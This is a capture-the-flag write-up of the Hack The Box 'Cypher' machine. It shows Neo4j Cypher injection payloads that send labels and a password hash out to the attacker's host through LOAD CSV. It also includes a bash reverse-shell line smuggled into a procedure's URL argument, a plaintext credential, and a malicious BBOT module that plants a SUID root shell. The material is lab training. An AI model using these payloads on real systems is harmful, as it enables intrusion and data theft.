---
title: "Cypher"
summary: "A full walkthrough of the Hack The Box 'Cypher' challenge from Season 7"
categories: ["HackTheBox","Blog",]
tags: ["HackTheBox","Web"]
#externalUrl: ""
#showSummary: true
date: 2025-04-20
draft: false
---

# Hack The Box: Cypher Writeup 
---

## Challenge Overview

- **Name:** Cypher  
- **Category:** Web  
- **Points:** 45  

A web-based challenge from Hack The Box Season 7 focusing on Cypher Injection in Neo4j and root privilege escalation via the BBOT OSINT tool.

---

## Step 1 – Initial Enumeration

We start with an `nmap` scan to identify open ports and services.

```bash
sudo nmap -sC -sV -vv -o nmap 10.10.11.57
```

**Results:**
```sh
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cypher.htb/
```

The web server redirected to **cypher.htb**, so we added it to `/etc/hosts`.  
The site displayed a **login form** that appeared to interact with a **Neo4j backend**.

---

## Step 2 – Neo4j Cypher Injection Discovery

Testing input fields with:
```sql
' OR 1=1 RETURN 1 AS foo //
```
confirmed a **Cypher Injection vulnerability**.

---

## Step 3 – Enumerating Neo4j Labels via OOB Exfiltration

We hosted a simple listener:
```bash
python3 -m http.server
```

and executed:
```sql
' OR 1=1 WITH 1 as a CALL db.labels() YIELD label 
LOAD CSV FROM "http://10.10.14.137:8000/?" + label AS b RETURN b //
```

**HTTP Server Output:**
```js
10.10.11.57 - - [19/Apr/2025 12:54:01] "GET /?USER HTTP/1.1" 200 -
10.10.11.57 - - [19/Apr/2025 12:54:01] "GET /?HASH HTTP/1.1" 200 -
...
```

This verified that we could **exfiltrate data via HTTP** using Neo4j’s `LOAD CSV FROM`.

---

## Step 4 – Extracting User Hashes

Next payload to retrieve credentials:

```rust
' OR 1=1 MATCH (u:USER)-[:SECRET]->(h:SHA1) 
WITH u.name + ":" + h.value AS creds 
LOAD CSV FROM "http://10.10.14.137:8000/?" + creds AS l RETURN 0 as _0 //
```

**Result:**
```js
10.10.11.57 - - [19/Apr/2025 12:56:46] "GET /?graphasm:9f54ca4c130be6d529a56dee59dc2b2090e43acf HTTP/1.1" 200 -
```

We extracted the user **graphasm** and their SHA1 password hash.

---

## Step 5 – Attempting Hash Cracking

```bash
echo "9f54ca4c130be6d529a56dee59dc2b2090e43acf" > hash.txt
john --format=raw-sha1 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

The hash could not be cracked via John or Hashcat.

---

## Step 6 – Remote Code Execution via `custom.getUrlStatusCode`

Neo4j supports **custom procedures**, which can lead to RCE if misused.  
We attempted a reverse shell payload using:

```sql
' return h.value as a union CALL custom.getUrlStatusCode("http://cypher.htb; bash -c 'bash -i >& /dev/tcp/10.10.14.137/4444 0>&1'") YIELD statusCode AS a RETURN a;//
```

With a listener:
```bash
nc -lvnp 4444
```

We gained a **reverse shell as the `neo4j` user**.

---

## Step 7 – SSH Pivot to User `graphasm`

We found credentials in `/home/graphasm/bbot_preset.yml`:

```yml
modules:
  neo4j:
    username: neo4j
    password: cU4btyib.20xtCMCXkBmerhK
```

Using them to SSH:
```bash
ssh graphasm@10.10.11.57
```

✅ Success — logged in as `graphasm` and retrieved the **user flag**.

---

## Step 8 – Privilege Escalation via BBOT

Running `sudo -l` showed:
```bash
(ALL) NOPASSWD: /usr/local/bin/bbot
```

This meant `bbot` could be executed as **root** without a password.

---

### BBOT Configuration Path Discovery

```bash
ls -l /usr/local/bin/bbot
/usr/local/bin/bbot -> /opt/pipx/venvs/bbot/bin/bbot
```

Since BBOT loads **custom Python modules**, we could exploit it to achieve privilege escalation.

---

### Crafting a Malicious BBOT Module

**Create a custom config:**
```bash
echo -e "module_dirs:\n - /tmp/modules" > /tmp/myconf.yml
mkdir -p /tmp/modules
```

**Malicious module:**
```python
from bbot.modules.base import BaseModule
import os

class whois2(BaseModule):
    watched_events = ["DNS_NAME"]
    produced_events = ["WHOIS"]
    flags = ["passive", "safe"]
    meta = {"description": "Malicious SUID Bash Dropper"}

    async def setup(self):
        os.system("cp /bin/bash /tmp/bash && chmod u+s /tmp/bash")
```

Execute it as root:
```bash
sudo /usr/local/bin/bbot -p /tmp/myconf.yml -m whois2 -t test.com
```

This creates a **root-owned SUID shell** at `/tmp/bash`.

---

## Step 9 – Root Access

Run the SUID shell:
```bash
/tmp/bash -p
id
```

**Output:**
```bash
uid=1000(graphasm) gid=1000(graphasm) euid=0(root)
```

Root access achieved — challenge complete!

---

## Final Thoughts

The Cypher challenge demonstrates:
- The risks of **Neo4j Cypher Injection** and **OOB data exfiltration**.  
- How **custom plugin systems (like BBOT)** can be leveraged for privilege escalation.  
- The importance of **sandboxing and restricting plugin directories** in production environments.

---

